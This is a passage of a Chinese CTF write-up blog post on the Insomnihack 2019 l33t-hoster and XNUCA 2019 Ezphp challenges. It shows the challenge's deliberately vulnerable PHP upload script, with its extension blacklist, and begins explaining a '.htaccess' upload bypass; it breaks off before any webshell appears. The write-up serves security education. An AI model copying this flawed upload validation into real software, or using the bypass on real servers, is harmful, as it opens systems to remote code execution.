<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="因为 Insomnihack 2019 l33t-hoster 这道题跟 XNUCA 2019 Qualifier Ezphp 如出一辙，比较类似，并且也是比较有意思的一题，所以两个题就放在一起写了\n"><title>XNUCA 2019 Qualifier Ezphp</title>
<link rel=canonical href=https://zeddyu.github.io/p/xnuca-2019-qualifier-ezphp/><link rel=stylesheet href=https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///scss/style.min.css integrity="sha256-fF7AdIPMSCGGaIS7UZHBfGQpV0YU38aZCzY1ucpb+iU=" crossorigin=anonymous><meta property='og:title' content="XNUCA 2019 Qualifier Ezphp"><meta property='og:description' content="因为 Insomnihack 2019 l33t-hoster 这道题跟 XNUCA 2019 Qualifier Ezphp 如出一辙，比较类似，并且也是比较有意思的一题，所以两个题就放在一起写了\n"><meta property='og:url' content='https://zeddyu.github.io/p/xnuca-2019-qualifier-ezphp/'><meta property='og:site_name' content="Zeddy's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='CTF'><meta property='article:published_time' content='2019-10-03T19:19:21+00:00'><meta property='article:modified_time' content='2019-10-03T19:19:21+00:00'><meta name=twitter:title content="XNUCA 2019 Qualifier Ezphp"><meta name=twitter:description content="因为 Insomnihack 2019 l33t-hoster 这道题跟 XNUCA 2019 Qualifier Ezphp 如出一辙，比较类似，并且也是比较有意思的一题，所以两个题就放在一起写了\n"><link rel="shortcut icon" href=/favicon.ico><style>body:has(.article-content){.article-readmore { display: none; }}</style><script>enScroll=!1,enFdl=!1,extCurrent=void 0,filename=void 0,targetText=void 0,splitOrigin=void 0;const lStor=localStorage,sStor=sessionStorage,doc=document,docEl=document.documentElement,docBody=document.body,docLoc=document.location,w=window,s=screen,nav=navigator||{},extensions=["pdf","xls","xlsx","doc","docx","txt","rtf","csv","exe","key","pps","ppt","pptx","7z","pkg","rar","gz","zip","avi","mov","mp4","mpe","mpeg","wmv","mid","midi","mp3","wav","wma"];function a(e,t,n,o){const j="G-PDESKL57LT",r=()=>Math.floor(Math.random()*1e9)+1,c=()=>Math.floor(Date.now()/1e3),F=()=>(sStor._p||(sStor._p=r()),sStor._p),E=()=>r()+"."+c(),_=()=>(lStor.cid_v4||(lStor.cid_v4=E()),lStor.cid_v4),m=lStor.getItem("cid_v4"),v=()=>m?void 0:enScroll==!0?void 0:"1",p=()=>(sStor.sid||(sStor.sid=c()),sStor.sid),O=()=>{if(!sStor._ss)return sStor._ss="1",sStor._ss;if(sStor.getItem("_ss")=="1")return void 0},a="1",g=()=>{if(sStor.sct)if(enScroll==!0)return sStor.sct;else x=+sStor.getItem("sct")+ +a,sStor.sct=x;else sStor.sct=a;return sStor.sct},i=docLoc.search,b=new URLSearchParams(i),h=["q","s","search","query","keyword"],y=h.some(e=>i.includes("&"+e+"=")||i.includes("?"+e+"=")),u=()=>y==!0?"view_search_results":enScroll==!0?"scroll":enFdl==!0?"file_download":"page_view",f=()=>enScroll==!0?"90":void 0,C=()=>{if(u()=="view_search_results"){for(let e of b)if(h.includes(e[0]))return e[1]}else return void 0},d=encodeURIComponent,k=e=>{let t=[];for(let n in e)e.hasOwnProperty(n)&&e[n]!==void 0&&t.push(d(n)+"="+d(e[n]));return t.join("&")},A=!1,S="https://ga.zdy.one/collect_path",M=k({v:"2",tid:j,_p:F(),sr:(s.width*w.devicePixelRatio+"x"+s.height*w.devicePixelRatio).toString(),ul:(nav.language||void 0).toLowerCase(),cid:_(),_fv:v(),_s:"1",dl:docLoc.origin+docLoc.pathname+i,dt:doc.title||void 0,dr:doc.referrer||void 0,sid:p(),sct:g(),seg:"1",en:u(),"epn.percent_scrolled":f(),"ep.search_term":C(),"ep.file_extension":e||void 0,"ep.file_name":t||void 0,"ep.link_text":n||void 0,"ep.link_url":o||void 0,_ss:O(),_dbg:A?1:void 0}),l=S+"?"+M;if(nav.sendBeacon)nav.sendBeacon(l);else{let e=new XMLHttpRequest;e.open("POST",l,!0)}}a();function sPr(){return(docEl.scrollTop||docBody.scrollTop)/((docEl.scrollHeight||docBody.scrollHeight)-docEl.clientHeight)*100}doc.addEventListener("scroll",sEv,{passive:!0});function sEv(){const e=sPr();if(e<90)return;enScroll=!0,a(),doc.removeEventListener("scroll",sEv,{passive:!0}),enScroll=!1}document.addEventListener("DOMContentLoaded",function(){let e=document.getElementsByTagName("a");for(let t=0;t<e.length;t++)if(e[t].getAttribute("href")!=null){const n=e[t].getAttribute("href"),s=n.substring(n.lastIndexOf("/")+1),o=s.split(".").pop();(e[t].hasAttribute("download")||extensions.includes(o))&&e[t].addEventListener("click",fDl,{passive:!0})}});function fDl(e){enFdl=!0;const t=e.currentTarget.getAttribute("href"),n=t.substring(t.lastIndexOf("/")+1),s=n.split(".").pop(),o=n.replace("."+s,""),i=e.currentTarget.text,r=t.replace(docLoc.origin,"");a(s,o,i,r),enFdl=!1}</script></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky compact"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io//img/avatar_hu6396534569623136415.webp width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>Zeddy's Blog</a></h1><h2 class=site-description></h2></div></header><ol class=menu-social><li><a href=https://github.com/ZeddYu target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://zeddyu.github.io/atom.xml target=_blank title=Rss rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://x.com/ZeddYu_Lu target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/ads/><svg class="icon icon-tabler icon-tabler-ad" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M7 15v-4a2 2 0 014 0v4"/><line x1="7" y1="13" x2="11" y2="13"/><path d="M17 9v6h-1.5a1.5 1.5.0 111.5-1.5"/></svg>
<span>Advertisement</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#xbm>XBM</a><ol><li><a href=#htaccess>.htaccess</a></li><li><a href=#webshell>webshell</a></li></ol></li><li><a href=#wbmp>WBMP</a><ol><li><a href=#htaccess-1>.htaccess</a></li><li><a href=#webshell-1>webshell</a></li></ol></li><li><a href=#get-shell>Get Shell</a></li></ol><ol><li><ol><li><a href=#one-way-error>One Way-error</a></li><li><a href=#n>\n</a></li><li><a href=#another-way-pcre>Another Way-Pcre</a></li><li><a href=#another-way-backward-slash>Another Way-backward slash</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/ctf/ style=background-color:#ce0000;color:#fff>CTF</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/xnuca-2019-qualifier-ezphp/>XNUCA 2019 Qualifier Ezphp</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Oct 03, 2019</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>14 minute read</time></div><div class=article-readmore><a href=/p/xnuca-2019-qualifier-ezphp/>Read More…</a></div></footer></div></header><section class=article-content><p>因为 Insomnihack 2019 l33t-hoster 这道题跟 XNUCA 2019 Qualifier Ezphp 如出一辙，比较类似，并且也是比较有意思的一题，所以两个题就放在一起写了</p><h1 id=l33t-hoster>L33T-HOSTER</h1><p>题目在<code>?source</code>直接给出了源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl> <span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;source&#34;</span><span class=p>]))</span> 
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>session_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s2>&#34;home&#34;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$_SESSION</span><span class=p>[</span><span class=s2>&#34;home&#34;</span><span class=p>]</span> <span class=o>=</span> <span class=nx>bin2hex</span><span class=p>(</span><span class=nx>random_bytes</span><span class=p>(</span><span class=mi>20</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$userdir</span> <span class=o>=</span> <span class=s2>&#34;images/</span><span class=si>{</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s2>&#34;home&#34;</span><span class=p>]</span><span class=si>}</span><span class=s2>/&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>file_exists</span><span class=p>(</span><span class=nv>$userdir</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>mkdir</span><span class=p>(</span><span class=nv>$userdir</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$disallowed_ext</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;php&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;php3&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;php4&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;php5&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;php7&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;pht&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;phtm&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;phtml&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;phar&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;phps&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;upload&#34;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;image&#39;</span><span class=p>][</span><span class=s1>&#39;error&#39;</span><span class=p>]</span> <span class=o>!==</span> <span class=nx>UPLOAD_ERR_OK</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;yuuuge fail&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$tmp_name</span> <span class=o>=</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;image&#34;</span><span class=p>][</span><span class=s2>&#34;tmp_name&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$name</span> <span class=o>=</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;image&#34;</span><span class=p>][</span><span class=s2>&#34;name&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$parts</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s2>&#34;.&#34;</span><span class=p>,</span> <span class=nv>$name</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$ext</span> <span class=o>=</span> <span class=nx>array_pop</span><span class=p>(</span><span class=nv>$parts</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=k>empty</span><span class=p>(</span><span class=nv>$parts</span><span class=p>[</span><span class=mi>0</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>array_shift</span><span class=p>(</span><span class=nv>$parts</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>count</span><span class=p>(</span><span class=nv>$parts</span><span class=p>)</span> <span class=o>===</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;lol filename is empty&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$ext</span><span class=p>,</span> <span class=nv>$disallowed_ext</span><span class=p>,</span> <span class=k>TRUE</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;lol nice try, but im not stupid dude...&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$image</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$tmp_name</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>mb_strpos</span><span class=p>(</span><span class=nv>$image</span><span class=p>,</span> <span class=s2>&#34;&lt;?&#34;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>FALSE</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;why would you need php in a pic.....&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>exif_imagetype</span><span class=p>(</span><span class=nv>$tmp_name</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;not an image.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$image_size</span> <span class=o>=</span> <span class=nx>getimagesize</span><span class=p>(</span><span class=nv>$tmp_name</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$image_size</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>!==</span> <span class=mi>1337</span> <span class=o>||</span> <span class=nv>$image_size</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>!==</span> <span class=mi>1337</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;lol noob, your pic is not l33t enough&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$name</span> <span class=o>=</span> <span class=nx>implode</span><span class=p>(</span><span class=s2>&#34;.&#34;</span><span class=p>,</span> <span class=nv>$parts</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>move_uploaded_file</span><span class=p>(</span><span class=nv>$tmp_name</span><span class=p>,</span> <span class=nv>$userdir</span> <span class=o>.</span> <span class=nv>$name</span> <span class=o>.</span> <span class=s2>&#34;.&#34;</span> <span class=o>.</span> <span class=nv>$ext</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;&lt;h3&gt;Your &lt;a href=</span><span class=si>$userdir</span><span class=s2>&gt;files&lt;/a&gt;:&lt;/h3&gt;&lt;ul&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nx>glob</span><span class=p>(</span><span class=nv>$userdir</span> <span class=o>.</span> <span class=s2>&#34;*&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=nv>$file</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;&lt;li&gt;&lt;a href=&#39;</span><span class=si>$file</span><span class=s2>&#39;&gt;</span><span class=si>$file</span><span class=s2>&lt;/a&gt;&lt;/li&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;&lt;/ul&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;h1&gt;Upload your pics!&lt;/h1&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;form method=&#34;POST&#34; action=&#34;?&#34; enctype=&#34;multipart/form-data&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;input type=&#34;file&#34; name=&#34;image&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;input type=&#34;submit&#34; name=upload&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;/form&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;!-- /?source --&gt;
</span></span></span></code></pre></td></tr></table></div></div><h2 id=xbm>XBM</h2><h3 id=htaccess>.htaccess</h3><p>我们可以发现其实是一个黑名单过滤，然后我们再看一下 http 的响应报文中有这么一个字段：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Server: Apache/2.4.29 (Ubuntu)
</span></span></code></pre></td></tr></table></div></div><p>所以我们可以先想到可能可以上传<code>.htaccess</code>，但是如果直接上传<code>.htaccess</code>的话，肯定会被直接 waf 掉</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$parts</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s2>&#34;.&#34;</span><span class=p>,</span> <span class=nv>$name</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$ext</span> <span class=o>=</span> <span class=nx>array_pop</span><span class=p>(</span><span class=nv>$parts</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p><code>explode</code>会将<code>$name</code>以<code>.</code>分割成数组</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>array</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>=&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nx>string</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>=&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nx>string</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=s2>&#34;htaccess&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><code>array_pop</code>会把<code>$parts</code>数组最后一个元素取出，并将长度减一。所以如果直接上传<code>.htaccess</code>，得到的后缀将是<code>htaccess</code>，得到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>array</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>=&gt;</span>
